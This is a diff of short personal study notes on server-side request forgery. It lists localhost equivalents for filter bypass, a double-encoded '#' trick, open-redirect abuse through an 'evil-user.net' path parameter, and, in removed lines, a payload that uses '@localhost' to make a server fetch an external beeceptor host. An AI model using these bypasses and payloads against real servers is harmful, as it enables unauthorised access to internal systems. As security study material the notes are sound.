@@ -1,6 +1,8 @@
-//https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
-//* other backend systems
-// you can scan the local addresses to see if any other systems are running on 192.168.0.X:8080
+// Serve Side Request Forgery
+//! Exploiting
+//* can be used to :
+// scan the local addresses to see if any other systems are running on 192.168.0.X:8080
+//! Filter Bypass
 //* localhost equivalents
 // 127.0.0.1
 // 127.1
@@ -21,11 +23,10 @@
 // note : you need to encode the # 2 tiems in order for this to work
 // because the first parser consider # a part of the name beacuse he see it encoded
 //* redirects (not static)
-// https://307.r3dir.me/--to/?url=http://localhost:80/ =>  http://localhost:80/
-// /product/nextProduct?currentProductId=6&path=http://evil-user.net => http://evil-user.net
+// you need to find how the application handles redirects
+// /product/nextProduct?&path=http://evil-user.net => http://evil-user.net
 //* other
 // double encoding chars
 // case variation
-
-//                                  #
-//? http://nexus-security.club:8048%23@localhost/console.php?cmd=fetch%28%2522https%253A%252F%252Fiwillneverreapeat.free.beeceptor.com%2522%29
+//? for more examples
+// https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
